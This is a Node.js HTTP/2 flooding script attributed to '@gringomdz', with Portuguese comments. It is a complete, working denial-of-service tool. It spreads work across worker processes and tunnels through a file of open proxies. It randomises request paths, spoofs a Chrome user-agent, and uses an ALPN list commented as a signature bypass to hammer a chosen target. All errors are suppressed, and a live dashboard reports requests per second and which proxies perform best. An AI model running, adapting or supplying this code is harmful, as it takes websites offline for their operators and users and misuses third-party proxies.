const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const colors = require('colors');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(l => l.length > 5);

// ALPN LIST COMPLETA (BYPASS DE ASSINATURA)
const ALL_ALPN = ['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'];

if (cluster.isMaster) {
    let totalSent = 0, rps = 0;
    const codes = {}, proxyHits = {};

    for (let i = 0; i < args.threads; i++) cluster.fork();

    setInterval(() => {
        console.clear();
        console.log('TLS-HTTPS : @gringomdz'.rainbow);
        console.log(`Target : ${parsedTarget.host} | Port : 443`.rainbow);
        console.log('──────────────────────────────────────────────────'.grey);
        console.log(`SENT TOTAL : ${totalSent.toLocaleString().green} | RPS : ${rps.toLocaleString().cyan}`);
        
        let st = Object.entries(codes).sort((a,b) => b[1]-a[1]).map(([c,v]) => `${c}: ${v}`).join(' | ');
        console.log(`STATUS CODES : ${st.yellow || 'PUSHING...'}`);
        console.log('──────────────────────────────────────────────────'.grey);
        console.log(`TOP 5 PROXIES PERFORMANCE:`.white);
        Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0, 5).forEach(([ip, count]) => {
            console.log(`> ${ip.padEnd(20)} - Hits: ${count.toString().green}`);
        });
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; rps += msg.c;
            if (msg.ip) proxyHits[msg.ip] = (proxyHits[msg.ip] || 0) + msg.c;
            if (msg.codes) for (let c in msg.codes) codes[c] = (codes[c] || 0) + msg.codes[c];
        }
    });
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    setInterval(runFlooder, 1);
}

function runFlooder() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr) return;
    const parsedProxy = proxyAddr.split(":");
    
    const socket = net.connect({ host: parsedProxy[0], port: ~~parsedProxy[1] });
    socket.setNoDelay(true);

    socket.once("connect", () => {
        socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
    });

    socket.once("data", (d) => {
        if (!d.toString().includes("200")) return socket.destroy();

        const tlsConn = tls.connect({
            socket: socket,
            servername: parsedTarget.host,
            ALPNProtocols: ALL_ALPN, // <--- OS OUTROS ALPN ESTÃO AQUI AGORA
            rejectUnauthorized: false,
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!eNULL",
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        }, () => {
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                createConnection: () => tlsConn,
                settings: { maxConcurrentStreams: 1000, initialWindowSize: 6291456 }
            });

            client.on("connect", () => {
                let bCount = 0; let bCodes = {};
                const burst = setInterval(() => {
                    if (!client || client.destroyed) return clearInterval(burst);
                    for (let i = 0; i < args.Rate; i++) {
                        const req = client.request({
                            ":method": "GET",
                            ":path": parsedTarget.path + "?" + crypto.randomBytes(3).toString('hex'),
                            ":scheme": "https",
                            ":authority": parsedTarget.host,
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                            "accept": "*/*",
                            "accept-language": "pt-BR,pt;q=0.9",
                            "cache-control": "no-cache"
                        });

                        req.on("response", (res) => {
                            const sc = res[":status"];
                            bCodes[sc] = (bCodes[sc] || 0) + 1;
                            bCount++;
                            if (bCount >= 50) {
                                process.send({ type: 'batch', c: bCount, codes: bCodes, ip: parsedProxy[0] });
                                bCount = 0; bCodes = {};
                            }
                            req.close(); req.destroy();
                        });
                        req.end();
                    }
                }, 1000);
            });
            client.on("error", () => socket.destroy());
        });
        tlsConn.on('error', () => socket.destroy());
    });
    socket.on("error", () => socket.destroy());
}
